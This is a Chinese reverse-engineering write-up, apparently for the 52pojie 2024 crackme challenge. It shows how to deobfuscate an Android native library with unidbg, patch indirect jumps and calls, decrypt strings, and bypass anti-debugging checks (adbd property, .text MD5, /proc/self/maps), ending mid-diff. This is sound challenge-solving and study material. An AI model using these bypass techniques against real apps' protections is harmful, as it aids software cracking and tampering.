hexrays F5 一开始就会划分基本块+得到控制流图，而这时间接跳转的目标地址还没被常量折叠出来（为了避免阻止自动常量折叠，需要将 .data section 改为只读）。由于这些基本块在控制流分析时就被丢掉了，因此即使手动确保把跳转目标块处于 IDA 识别的正确的函数中，hexrays 也会显示JUMPOUT。</p></li><li style="margin-left: 2px;"><p>而一部分 call 会显示为一个明显可以常量折叠的表达式，但 hexrays 在全局优化阶段才有条件折叠出这些值来（因为这些表达式中包含一个只在首个基本块里修改的变量，而其他基本块在局部优化阶段无从得知这个变量是固定的），而这时已经过了调用分析阶段了。</p></li></ol><p>至于 ghidra/binja 表现的更差（binja 把 .data 标记为只读后 HLIL 一直在两种结果间切换显示，不知道发生了什么），也就不考虑了。</p><p>因为本菜鸡并不会让 hexrays 的这些分析阶段反复跑多遍，因此考虑用unidbg得到间接跳转/调用的目标，将相关代码直接 patch 成直接跳转和直接调用来使得 hexrays 恢复分析能力。</p><p>换言之整个流程就是：</p><ol><li style="margin-left: 2px;"><p>运行 unidbg 记录跳转目标</p></li><li style="margin-left: 2px;"><p>根据记录 patch i64</p></li><li style="margin-left: 2px;"><p>阅读 hexrays 输出（结合主分发器处 unidbg 断点输出的日志；对于复杂内容可能需要对部分函数打断点打印入参和返回值）了解本次运行发生了什么</p></li><li style="margin-left: 2px;"><p>调整输入和补充unidbg代码使得程序能继续正常运行</p></li><li style="margin-left: 2px;"><p>回到1，直到分析出整个验证成功的路径</p></li></ol><h4>间接调用处理</h4><p>由于整个程序没有虚表调用（除去调用JNI functions），因此可以patch几乎（除去JNI calls）所有BLR X*指令为BL [X*]指令。</p><p>我一开始是在整个 module 下进行 unicorn code hook，发现当前是 BLR 指令就标记一个变量，code hook 开始时发现该变量置位（也就跑下一条指令时），记录下跳转目标地址。这样的做法的问题是对于跳到 module 外的 CALL，记录的跳转目标是 PC+4(我一开始还把这个当假NOP了QAQ)。因此我将记录方式修改为了 BLR 指令运行时直接读取 X* 寄存器的值来得到跳转目标地址。</p><p>值得注意的是，对于外部调用，会使用一个被动态链接器重定位为（调用目标+常量）的值来算出（调用目标），而 unidbg 里对于这种重定位项的实现是错误的，需要修复：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java b/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java<br />index 3bba96cf..b0402590 <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java<br />@@ -<span style="color: rgb(255, 115, 253);">37</span>,<span style="color: rgb(255, 115, 253);">7</span> +<span style="color: rgb(255, 115, 253);">37</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span> {<br />             <span style="color: rgb(255, 255, 182);">LinuxModule</span> <span style="color: rgb(198, 197, 254);">module</span> = (LinuxModule) m;<br />             <span style="color: rgb(255, 255, 182);">Long</span> <span style="color: rgb(198, 197, 254);">symbolHook</span> = <span style="color: rgb(150, 203, 254);">module</span>.hookMap.get(symbolName);<br />             <span style="color: rgb(150, 203, 254);">if</span> (symbolHook != <span style="color: rgb(198, 197, 254);">null</span>) {<br />-                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, symbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolHook);<br />+                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, symbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolHook + offset);<br />             }<br /><br />             <span style="color: rgb(255, 255, 182);">ElfSymbol</span> <span style="color: rgb(198, 197, 254);">elfSymbol</span> = <span style="color: rgb(150, 203, 254);">module</span>.getELFSymbolByName(symbolName);<br />@@ -<span style="color: rgb(255, 115, 253);">46</span>,<span style="color: rgb(255, 115, 253);">10</span> +<span style="color: rgb(255, 115, 253);">46</span>,<span style="color: rgb(255, 115, 253);">10</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span> {<br />                     <span style="color: rgb(150, 203, 254);">case</span> ElfSymbol.BINDING_GLOBAL:<br />                     <span style="color: rgb(150, 203, 254);">case</span> ElfSymbol.BINDING_WEAK:<br />                         <span style="color: rgb(150, 203, 254);">for</span> (HookListener listener : listeners) {<br />-                            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">hook</span> = listener.hook(svcMemory, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolName, <span style="color: rgb(150, 203, 254);">module</span>.base + elfSymbol.value + offset);<br />+                            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">hook</span> = listener.hook(svcMemory, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolName, <span style="color: rgb(150, 203, 254);">module</span>.base + elfSymbol.value);<br />                             <span style="color: rgb(150, 203, 254);">if</span> (hook &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />                                 <span style="color: rgb(150, 203, 254);">module</span>.hookMap.put(symbolName, hook);<br />-                                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, elfSymbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, hook);<br />+                                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, elfSymbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, hook + offset);<br />                             }<br />                         }</code></pre><p>然后由于有些调用的目标不是模块内函数，我们需要知道的不是调用目标的地址，而是符号名（有点类似于Windows脱壳的导入表修复）。</p><p>虽然 unidbg 提供的 findClosestSymbolByAddress 函数可通过指针来反推符号，但并不支持对于createVirtualModule创建的用Java代码实现的虚拟Module以及用Loader::addHookListener添加的钩子拦截的符号解析，为了完成反推，需要增加相关功能：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java b/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java<br />index 8dd3d0b8..c5513e3e <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java<br />+++ b/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java<br />@@ -<span style="color: rgb(255, 115, 253);">28</span>,<span style="color: rgb(255, 115, 253);">12</span> +<span style="color: rgb(255, 115, 253);">28</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">import</span> java.io.IOException;<br /> <span style="color: rgb(150, 203, 254);">import</span> java.io.OutputStream;<br /> <span style="color: rgb(150, 203, 254);">import</span> java.nio.charset.StandardCharsets;<br /> <span style="color: rgb(150, 203, 254);">import</span> java.nio.file.Files;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.ArrayList;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.Arrays;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.Collection;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.List;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.Map;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.TreeMap;<br />+<span style="color: rgb(150, 203, 254);">import</span> java.util.*;<br /><br /> <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">abstract</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">AbstractLoader</span>&lt;T <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">NewFileIO</span>&gt; <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">Memory</span>, Loader {<br /><br />@@ -<span style="color: rgb(255, 115, 253);">249</span>,<span style="color: rgb(255, 115, 253);">9</span> +<span style="color: rgb(255, 115, 253);">244</span>,<span style="color: rgb(255, 115, 253);">21</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">abstract</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">AbstractLoader</span>&lt;T <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">NewFileIO</span>&gt; <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">Memory</span>, Loa<br /><br />     <span style="color: rgb(150, 203, 254);">protected</span> <span style="color: rgb(150, 203, 254);">final</span> List&lt;HookListener&gt; hookListeners = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();<br /><br />+    <span style="color: rgb(150, 203, 254);">protected</span> <span style="color: rgb(150, 203, 254);">final</span> Map&lt;Long, HookedSymbol&gt; hookedSymbolMap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">final</span> HookedSymbol <span style="color: rgb(255, 255, 182);">findHookedSymbol</span>(<span style="color: rgb(255, 255, 182);">long</span> address) {<br />+        <span style="color: rgb(150, 203, 254);">return</span> hookedSymbolMap.get(address);<br />+    }<br />+<br />     <span style="color: rgb(124, 124, 124);">@Override</span><br />     <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addHookListener</span>(HookListener listener) {<br />-        hookListeners.add(listener);<br />+        hookListeners.add((svcMemory, libraryName, symbolName, old) -&gt; {<br />+            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">addr</span> = listener.hook(svcMemory, libraryName, symbolName, old);<br />+            <span style="color: rgb(150, 203, 254);">if</span> (addr &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />+                hookedSymbolMap.put(addr, <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HookedSymbol</span>(addr, libraryName, symbolName));<br />+            }<br />+            <span style="color: rgb(150, 203, 254);">return</span> addr;<br />+        });<br />     }<br /><br />     <span style="color: rgb(150, 203, 254);">protected</span> LibraryResolver libraryResolver;<br />diff --git a/unidbg-api/src/main/java/com/github/unidbg/spi/HookedSymbol.java b/unidbg-api/src/main/java/com/github/unidbg/spi/HookedSymbol.java<br />index 2017dda2..0a657f20 <span style="color: rgb(255, 115, 253);">100644</span><br />+++ b/unidbg-api/src/main/java/com/github/unidbg/spi/HookedSymbol.java<br />@@ -<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">2</span> +<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">25</span> @@<br />+<span style="color: rgb(150, 203, 254);">package</span> com.github.unidbg.spi;<br />+<br />+<span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">HookedSymbol</span> {<br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">long</span> address;<br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">final</span> String library;<br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">final</span> String symbol;<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">HookedSymbol</span>(<span style="color: rgb(255, 255, 182);">long</span> address, String library, String symbol) {<br />+        this.address = address;<br />+        this.library = library;<br />+        this.symbol = symbol;<br />+    }<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(255, 255, 182);">getAddress</span>() {<br />+        <span style="color: rgb(150, 203, 254);">return</span> address;<br />+    }<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> String <span style="color: rgb(255, 255, 182);">getLibrary</span>() {<br />+        <span style="color: rgb(150, 203, 254);">return</span> library;<br />+    }<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> String <span style="color: rgb(255, 255, 182);">getSymbol</span>() {<br />+        <span style="color: rgb(150, 203, 254);">return</span> symbol;<br />+    }<br />+ }<br />diff --git a/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java b/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java<br />index af1b3b7b..36010f5c <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java<br />+++ b/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java<br />@@ -<span style="color: rgb(255, 115, 253);">38</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">38</span>,<span style="color: rgb(255, 115, 253);">8</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">interface</span> <span style="color: rgb(255, 255, 182);">Loader</span> {<br /><br />     <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addHookListener</span>(HookListener listener);<br /><br />+    HookedSymbol <span style="color: rgb(255, 255, 182);">findHookedSymbol</span>(<span style="color: rgb(255, 255, 182);">long</span> address);<br />+<br />     Collection&lt;Module&gt; <span style="color: rgb(255, 255, 182);">getLoadedModules</span>();<br /><br />     String <span style="color: rgb(255, 255, 182);">getMaxLengthLibraryName</span>();<br />diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java b/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java<br />index 1798821e..d804c582 <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java<br />@@ -<span style="color: rgb(255, 115, 253);">73</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">73</span>,<span style="color: rgb(255, 115, 253);">20</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">LinuxModule</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">Module</span> {<br />                 }<br />             }<br />             <span style="color: rgb(124, 124, 124);">@Override</span><br />+            <span style="color: rgb(150, 203, 254);">public</span> Symbol <span style="color: rgb(255, 255, 182);">findClosestSymbolByAddress</span>(<span style="color: rgb(255, 255, 182);">long</span> address, <span style="color: rgb(255, 255, 182);">boolean</span> fast) {<br />+                <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">Mutable</span> {<br />+                    <span style="color: rgb(255, 255, 182);">Symbol</span> <span style="color: rgb(198, 197, 254);">bestSymbol</span> = <span style="color: rgb(198, 197, 254);">null</span>;<br />+                };<br />+                <span style="color: rgb(255, 255, 182);">Mutable</span> <span style="color: rgb(198, 197, 254);">mutable</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Mutable</span>();<br />+                symbols.forEach((name, value) -&gt; {<br />+                    <span style="color: rgb(150, 203, 254);">if</span> (value.peer &gt; address) <span style="color: rgb(150, 203, 254);">return</span>;<br />+                    <span style="color: rgb(150, 203, 254);">if</span> (mutable.bestSymbol == <span style="color: rgb(198, 197, 254);">null</span> || mutable.bestSymbol.getAddress() &lt; value.peer) {<br />+                        mutable.bestSymbol = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">VirtualSymbol</span>(name, this, value.peer);<br />+                    }<br />+                });<br />+                <span style="color: rgb(150, 203, 254);">return</span> mutable.bestSymbol;<br />+            }<br />+            <span style="color: rgb(124, 124, 124);">@Override</span><br />             <span style="color: rgb(150, 203, 254);">public</span> ElfSymbol <span style="color: rgb(255, 255, 182);">getELFSymbolByName</span>(String name) {<br />                 <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />             }</code></pre><p>然后我们就可以用类似下面的代码来得到每个调用目标的符号名（如果调用目标不是当前so的函数的话）：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">Module</span> <span style="color: rgb(198, 197, 254);">module2</span> = emulator.getMemory().findModuleByAddress(v.BLRTarget);<br /><span style="color: rgb(255, 255, 182);">Symbol</span> <span style="color: rgb(198, 197, 254);">symbol</span> = module2 == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(198, 197, 254);">null</span> : module2.findClosestSymbolByAddress(v.BLRTarget, <span style="color: rgb(198, 197, 254);">true</span>);<br /><span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">moduleName</span> = module2 == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(168, 255, 96);">"(null)"</span> : module2.name;<br /><span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">symbolName</span> = symbol == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(168, 255, 96);">"(null)"</span> : symbol.getName();<br /><span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">symbolAddr</span> = symbol == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(255, 115, 253);">0</span> : symbol.getAddress();<br /><span style="color: rgb(255, 255, 182);">HookedSymbol</span> <span style="color: rgb(198, 197, 254);">hookedSymbol</span> = memory.findHookedSymbol(v.BLRTarget);<br /><span style="color: rgb(150, 203, 254);">if</span> (hookedSymbol != <span style="color: rgb(198, 197, 254);">null</span>) {<br />    moduleName = hookedSymbol.getLibrary();<br />    symbolName = hookedSymbol.getSymbol();<br />    symbolAddr = hookedSymbol.getAddress();<br />}<br /><span style="color: rgb(124, 124, 124);">// JNI func not covered here(since it is not required here)</span><br />System.out.printf(<span style="color: rgb(168, 255, 96);">"[0x%s, \"%s\", \"%s\", 0x%x]"</span>, Long.toHexString(v.ins.getAddress() - <span style="color: rgb(150, 203, 254);">module</span>.base), moduleName, symbolName, v.BLRTarget - symbolAddr);</code></pre><p>这样下来仍然没有解析出的符号经验证全是 JNI calls。（完整 unidbg 记录代码见附件 Chunjie24Day7.java，完整 patch 代码见附件 patcher.py）</p><h4>间接条件跳转处理</h4><p>间接跳转不像间接调用那样反汇编出来是 BLR 就一定是混淆生成的，因此需要一定的手动模式匹配。</p><p>大部分条件间接跳转的核心语句是 CSEL X*, X*, X*, LT/EQ，然后是若干条不影响内存的 mov/add/orr/ldr 指令（但也有 stur），最后是一条 BR。</p><p>一开始我的做法是：一旦识别到符合条件的 CSEL 后我就会跟踪到 BR 的后一条指令，直到得知本次跳转的目标地址。</p><p>这样做还需要读取nzcv寄存器，来弄清楚此次跳转是在满足还是未满足条件的情况下进行的跳转（nzcv状态寄存器的值与条件码的对应关系见 NZCV寄存器简介 条件码简介）。</p><p>但这样直接错失了得到另一种状态下跳转目标的值的机会，因此最终我选择了这样做：</p><ol><li style="margin-left: 2px;"><p>模式匹配上 csel 指令后，保存当前寄存器上下文</p></li><li style="margin-left: 2px;"><p>将nzcv寄存器置为条件不满足</p></li><li style="margin-left: 2px;"><p>标记testCase变量后继续执行直到BR的下一条指令（过程中遇到stur指令（会导致无法通过上下文恢复的内存修改）直接修改PC跳过，经测试，跳过是不影响结果的）</p></li><li style="margin-left: 2px;"><p>记录跳转目标，恢复上下文</p></li><li style="margin-left: 2px;"><p>将nzcv寄存器置为条件满足，再来一遍3和4</p></li><li style="margin-left: 2px;"><p>正常执行csel</p></li></ol><p>因为上述流程是写在每条指令都会触发的 code hook 的回调里的，因此该流程要像状态机那样写。</p><p>对于 patch 而言值得注意的是：由于条件满足或不满足会跳转到不同位置，因此需要 patch 出两条不同的B.cond imm指令，而可供覆盖的 BR 指令只有一条。我的做法是 patch BR指令及其前一条指令（而 BR 指令前的指令除了一处外全是 add Xx, Xx, X*，是用来修改存储 BR Xx 的跳转目标寄存器 Xx 的；对于唯一的另外，手动交换那条指令与前面的 add 指令后 patch）。</p><p>完整 unidbg 记录代码见附件 Chunjie24Day7.java，完整 patch 代码见附件 patcher.py。</p><p>值得注意的是，unicorn 在调用 context_restore 恢复上下文的时候有个 bug：对PC的恢复并不会生效。</p><p>这是因为 unicorn 对 code hook 期间修改 PC 的支持是写在 reg_write 的 PC 分支的代码里的（见实现这一功能的 commit），因此我们需要在恢复上下文后显式设置 PC 一次：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">backend.reg_write(Arm64Const.UC_ARM64_REG_PC, backend.reg_read(Arm64Const.UC_ARM64_REG_PC));</code></pre><h4>拼接 function chunks</h4><p>由于间接跳转阻断了正常的控制流分析，导致 IDA 分析出来的函数由断断续续的 chunks 组成，而实际的函数是连续的一大段的代码，因此需要手工标识。</p><p>附件 patcher.py 的 link_chunks 函数是一个辅助函数，传入已经被识别成函数体的任意 chunks 的任意 ea，和该函数的实际末尾的 ea（不含该 ea；通常是 ret 后或 BL .__stack_chk_fail 后），即可自动把这一整段识别为一个函数。</p><h4>性能优化</h4><p>整个 so 库执行的过程中，MD5 .text 节和两次 modPow 都相当耗时且会执行大量代码，为此需要优化 unidbg 的执行速度。</p><p>我的做法是：对于指令反汇编等操作，每个 PC 只会执行一次并存在 Map 中；对于很久没有出现新指令的情况，不再继续跟踪跳转/调用（标记 usingBasicHook = true；因为显然是处在某些循环里跑了很多轮了，再跟踪意义不大），只做最简单的判断，直到出现新的指令。</p><p>同时，还会记下是执行到收集了多少条不同 PC 的指令后开始停止详细跟踪的，后面出现的新的指令的 PC 是什么并打印（见 breakable Map，此外还会记录到出现新指令为止共跑了多少条指令到 skipTo Map，使得记录当前一共执行了多少条指令的参考日志（用于判断函数/循环的“大小”）正常输出）。这些输出作为常量保存；在下一次运行的时候一旦达到符合条件的情况，就解除原有 code hook，在新的指令的 PC 处创建一个新的 code hook，该 hook 的内容是恢复原有 hook，这样虽然 qemu 仍然没法不被打断地执行指令（unicorn 的后端，qemu，可在这种情况下用 JIT 执行指令），但这中间不会出现 Java 代码，相关的检查是纯 C 的 unicorn 做的。（见附件 Chunjie24Day7.java 的 Hooks 类的成员变量的使用。）</p><h4>字符串加密</h4><p>这个比较简单，看到字符串加密函数就在 unidbg 里打断点看看返回什么：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">long</span>[] decodedFunc = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">long</span>[]{<span style="color: rgb(255, 115, 253);">0x19398</span>, <span style="color: rgb(255, 115, 253);">0x19C88</span>, <span style="color: rgb(255, 115, 253);">0x18A1C</span>, <span style="color: rgb(255, 115, 253);">0x1A314</span>, <span style="color: rgb(255, 115, 253);">0x23BF4</span>};<br /><span style="color: rgb(124, 124, 124);">/*<br />18a1c(decoded string): /proc/self/maps<br />19398(decoded string): %*x-%*lx %*4s %*lx %*s %*s %s<br />19c88(decoded string): com.wuaipojie.crackme2024<br />1a314(decoded string): /base.apk<br />23bf4(decoded string): ([BLjava/lang/String;)Z<br /> */</span><br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">long</span> addr : decodedFunc) {<br />    debugger.addBreakPoint(<span style="color: rgb(150, 203, 254);">module</span>.base + addr, (emulator2, address) -&gt; {<br />        debugger.addBreakPoint(emulator2.getContext().getLRPointer().peer, (emulator1, address1) -&gt; {<br />            System.out.println(Long.toHexString(addr) + <span style="color: rgb(168, 255, 96);">"(decoded string): "</span> + emulator1.getContext().getPointerArg(<span style="color: rgb(255, 115, 253);">0</span>).getString(<span style="color: rgb(255, 115, 253);">0</span>));<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />        });<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />    });<br />}</code></pre><p>而实际的字符串字面量解密过程就是 .rodata 里读两段连续的字节流，前面的长度与内容的字节流作为key，异或解密后面一段字节流作为字符串内容。</p><p>除此之外一些字符串字面量解密后会立即被随机生成的加密函数加密，然后等字符串要用的使用再解密出来，这个没什么意义。</p><h3>反反调试</h3><p>有一说一，第一个反调试极大的增强了我开始做时的信心，因为我发现验证逻辑跑了几万条指令就结束了，似乎非常简单（doge）</p><h4>USB 调试检查</h4><p>通过调用 <code style="font-family: SFMono-Regular, Consolas, ;">__system_property_get</code> 来取得 <code style="font-family: SFMono-Regular, Consolas, ;">init.svc.adbd</code> 这一属性，并判断是否是 running。</p><p>启用 adb 是很常见的操作，较少用于反调试（更坏心眼的是有提示用adb来输入长字符串），所以甚至 unidbg 的默认的 <code style="font-family: SFMono-Regular, Consolas, ;">/dev/__properties__</code> 文件中这一属性的值也是 running。</p><p>为此，需要hook这个函数，把内容改成 stopped 或者别的什么。</p><h4>内存读取</h4><p>第一个十分耗时的函数容易通过一些 magic number 识别为 MD5 算法，而 hook 得知十分耗时的被 MD5 的内容就是 start 函数开始（或 plt 表结束后）到 .text 结束的内容。</p><p>这些内容只读且没有经过任何重定位修改，因此内容和直接从文件中读出来相同。</p><p>得益于 unicorn 的 code hook 不需要修改代码段内容来设置软断点，因此这一反调试可以无视。</p><h4>apk 读取</h4><p>随后的 MD5 会对一个32位整数进行，而在此之前还会读取 /proc/self/maps 来获得一些信息（根据 syscall 日志得知）。</p><p>通过 Java 调试容易发现 unidbg 模拟的 maps 信息里只有 so 库的地址；通过字符串解密可以得到 com.wuaipojie.crackme2024 base.apk 等内容，可以猜测是想找到对 apk 的内存映射段。</p><p>我们在 MapsFileIO.java 里添加追加自定义内存段信息的功能：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java b/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java<br />index d3537724..18a8c74c <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java<br />@@ -<span style="color: rgb(255, 115, 253);">17</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">17</span>,<span style="color: rgb(255, 115, 253);">12</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 